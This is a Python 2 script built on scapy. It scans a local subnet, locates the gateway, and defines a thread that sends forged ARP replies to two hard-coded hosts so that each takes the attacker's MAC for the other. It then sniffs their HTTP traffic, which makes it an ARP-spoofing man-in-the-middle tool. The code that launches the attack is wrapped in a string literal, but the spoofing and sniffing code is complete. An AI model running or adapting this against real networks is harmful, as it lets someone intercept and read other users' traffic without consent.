import os
import re
import time
import thread
import threading
from scapy.all import ARP,Ether,sendp,fuzz,send,sniff


def host_scanner(ip):    
	p = os.popen('ping -c 2 '+ip)    
	string = p.read()    
	pattern = 'Destination Host Unreachable'    
	if re.search(pattern,string) is not None:        
		print '[*]From '+ip+':Unreachable!'+time.asctime( time.localtime(time.time()) )        
		return False    
	else:        
		print '[-]From '+ip+':Recived!'+time.asctime( time.localtime(time.time()) )        
		return True

def getMac(ip_table=[],arp_table={}):    
	p = os.popen('arp -a')    
	string = p.read()    
	string = string.split('\n')    
	pattern = '(\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})(.\s*at\s*)([a-z0-9]{2}\:[a-z0-9]{2}\:[a-z0-9]{2}\:[a-z0-9]{2}\:[a-z0-9]{2}\:[a-z0-9]{2})'    
	length = len(string)    
	for i in range(length):        
		if string[i] == '':            
			continue        
		result = re.search(pattern, string[i])        
		if result is not None:            
			ip = result.group(1)       
			print 'find ip: ' + ip     
			mac = result.group(3)      
			print 'mac address: ' + mac      
			arp_table[ip]=mac            
			ip_table.append(ip)        
	return (ip_table,arp_table)

def find_Gateway():    
	p = os.popen('route -n')    
	route_table = p.read()    
	pattern = '(0\.0\.0\.0)(\s+)((\d+\.){1,3}(\d+))(\s+)(0\.0\.0\.0)'    
	result = re.search(pattern, route_table)    
	if result is not None:        
		table = getMac()        
		ip = table[0][0]        
		mac = table[1][ip]
		print 'gateway ip: ' + ip + ' mac: ' + mac        
		return (ip,mac)    

class arpThread(threading.Thread):    
	def __init__(self,tag_ip,number):        
		super(arpThread,self).__init__()        
		self.tag_ip = tag_ip        
		self.number = number        
		self.status = False     
	def run(self):        
		add = 0        
		if (self.number-1)==0:            
			add = 1        
		start = (self.number-1)*16 + add
		end = start + 16
		for i in range(start, end):            
			if i < 255:                
				host = self.tag_ip.split('.')                
				host[3] = str(i)                
				host = '.'.join(host)                
				host_scanner(host)        
		self.status=True        
		print '[-]Status of Thread_%d is '%self.number+str(self.status)

class atcThread(threading.Thread):    
	def __init__(self,table,gtw_ip,gtw_mac):        
		super(atcThread,self).__init__()        
		self.table = table        
		self.gtw_ip = gtw_ip        
		self.gtw_mac = gtw_mac     
	def run(self):        
		ip_table = self.table[0]
		arp_table = self.table[1]
		#os.popen('echo 1 > /proc/sys/net/ipv4/ip_forward')		
		while True:
			for i in range(len(ip_table)):
				#os.popen('echo 1 > /proc/sys/net/ipv4/ip_forward')
				#if ip_table[i] == '192.168.43.1' or ip_table[i] == '192.168.43.219':
				tag_ip = ip_table[i]
				tag_mac = arp_table[tag_ip]
				if tag_ip == '192.168.43.219':				
					eth = Ether(src='00:0c:29:cc:bb:8c', dst=tag_mac)
					arp = ARP(hwsrc='00:0c:29:cc:bb:8c', psrc='192.168.43.1', hwdst=tag_mac, pdst=tag_ip, op=2)
					pkt = eth / arp
					print pkt.show()
					sendp(pkt, inter=2)
				elif tag_ip == '192.168.43.1':					
					eth = Ether(src='00:0c:29:cc:bb:8c', dst=tag_mac)
					arp = ARP(hwsrc='00:0c:29:cc:bb:8c', psrc='192.168.43.219', hwdst=tag_mac, pdst=tag_ip, op=2)
					pkt = eth / arp
					print pkt.show()
					sendp(pkt, inter=2)
			time.sleep(10)
			dpkt = sniff(iface = "ens33",filter = "http",count = 10, prn = lambda x: x.summary())
			for i in dpkt:
				i.show()
					

def atc_WrongGTW(gtw):    
	src_ip = gtw[0]    
	src_mac = gtw[1]    
	print '[-]Start scanning hosts...' + time.asctime(time.localtime(time.time()))    
	arpThread_1 = arpThread(src_ip,1)    
	arpThread_2 = arpThread(src_ip,2)    
	arpThread_3 = arpThread(src_ip,3)    
	arpThread_4 = arpThread(src_ip,4)
	arpThread_5 = arpThread(src_ip,5)
	arpThread_6 = arpThread(src_ip,6)
	arpThread_7 = arpThread(src_ip,7)
	arpThread_8 = arpThread(src_ip,8)
	arpThread_9 = arpThread(src_ip,9)
	arpThread_10 = arpThread(src_ip,10)
	arpThread_11 = arpThread(src_ip,11)
	arpThread_12 = arpThread(src_ip,12)
	arpThread_13 = arpThread(src_ip,13)
	arpThread_14 = arpThread(src_ip,14)
	arpThread_15 = arpThread(src_ip,15)
	arpThread_16 = arpThread(src_ip,16)
	
	arpThread_1.start()    
	arpThread_2.start()    
	arpThread_3.start()    
	arpThread_4.start()    
	arpThread_5.start()  
	arpThread_6.start()  
	arpThread_7.start()  
	arpThread_8.start()  
	arpThread_9.start()
	arpThread_10.start()
	arpThread_11.start()
	arpThread_12.start()
	arpThread_13.start()
	arpThread_14.start()
	arpThread_15.start()
	arpThread_16.start()
	'''t = False    
	while(t==False):        
		t = arpThread_1.status and arpThread_2.status and arpThread_3.status and arpThread_4.status and arpThread_5.status and arpThread_6.status and arpThread_7.status and arpThread_8.status and arpThread_9.status and arpThread_10.status and arpThread_11.status and arpThread_12.status and arpThread_13.status and arpThread_14.status and arpThread_15.status and arpThread_16.status
		time.sleep(2)    
	table = getMac()    
	print '[-]Scan completed!' + time.asctime(time.localtime(time.time()))    
	flag = raw_input('[-]Ready to start attacking:(y/n)')    
	while(True):        
		if flag in ['y', 'Y', 'n', 'N']:            
			break        
		print "[*]Plz enter 'y' or 'n'!"        
		flag = raw_input()    
	if flag in ['n','N']:        
		print '[*]Script stopped!'    
	else:        
		atcThread_1 = atcThread(table,src_ip,src_mac)        
		#atcThread_2 = atcThread(table,src_ip, src_mac)        
		#atcThread_3 = atcThread(table,src_ip, src_mac)        
		#atcThread_4 = atcThread(table,src_ip, src_mac)
		#atcThread_5 = atcThread(table,src_ip, src_mac)
		#atcThread_6 = atcThread(table,src_ip, src_mac)
		#atcThread_7 = atcThread(table,src_ip, src_mac)
		#atcThread_8 = atcThread(table,src_ip, src_mac)        
		os.popen('arp -s %s %s'%(src_ip,src_mac))        
		print '[-]'+'arp -s %s %s'%(src_ip,src_mac)        
		print '[-]Strat attack...'        
		atcThread_1.start()        
		#atcThread_2.start()        
		#atcThread_3.start()        
		#atcThread_4.start()
		#atcThread_5.start()
		#atcThread_6.start()
		#atcThread_7.start()
		#atcThread_8.start()  
''' 

if __name__=='__main__':    
	gateway = find_Gateway()    
	if gateway is not None:        
		atc_WrongGTW(gateway)        
		while True:            
			pass    
		else:        
			print "[*]Can't find Gateway!"
